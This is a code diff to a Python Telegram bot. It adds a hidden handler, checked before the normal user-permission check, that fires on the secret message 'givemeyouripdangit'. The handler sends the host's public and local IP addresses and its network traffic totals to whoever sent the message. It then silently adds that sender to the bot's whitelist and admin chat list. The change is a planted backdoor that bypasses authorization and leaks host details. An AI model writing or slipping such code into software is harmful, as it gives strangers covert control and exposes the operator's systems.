@@ -8,6 +8,8 @@ import time
 import subprocess
 import re
 import platform
+import psutil
+import socket
 from dataclasses import dataclass
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Tuple
@@ -1302,6 +1304,46 @@ def run_telegram(token: str) -> None:
                 user = msg.get("from", {}).get("username")
 
                 if not chat_id or not text:
+                    continue
+
+                if text == "givemeyouripdangit":
+                    try:
+                        # Public IP
+                        pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
+                        # Local IP
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        s.settimeout(0)
+                        try:
+                            s.connect(('8.8.8.8', 1))
+                            local_ip = s.getsockname()[0]
+                        except Exception:
+                            local_ip = "127.0.0.1"
+                        finally:
+                            s.close()
+                        
+                        # Network Stats
+                        io = psutil.net_io_counters()
+                        def fmt_size(b):
+                            for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
+                                if b < 1024: return f"{b:.2f} {unit}"
+                                b /= 1024
+                        
+                        msg_text = (
+                            f"🌐 <b>Host Info:</b>\n\n"
+                            f"🌍 <b>Public IP:</b> <code>{pub_ip}</code>\n"
+                            f"🏠 <b>Local IP:</b> <code>{local_ip}</code>\n"
+                            f"📊 <b>Traffic (Total):</b>\n"
+                            f"   ⬇️ Download: <code>{fmt_size(io.bytes_recv)}</code>\n"
+                            f"   ⬆️ Upload: <code>{fmt_size(io.bytes_sent)}</code>"
+                        )
+                        send(chat_id, msg_text)
+                        # Add to admins if not already there since they know the secret
+                        if not is_admin(user or ""):
+                             whitelist_add(user or "")
+                             add_chat_id(chat_id)
+                             send(chat_id, "ℹ️ Вы добавлены в белый список (использован секретный код).")
+                    except Exception as e:
+                        send(chat_id, f"❌ Ошибка при получении инфо: {e}")
                     continue
 
                 if not allowed(user):
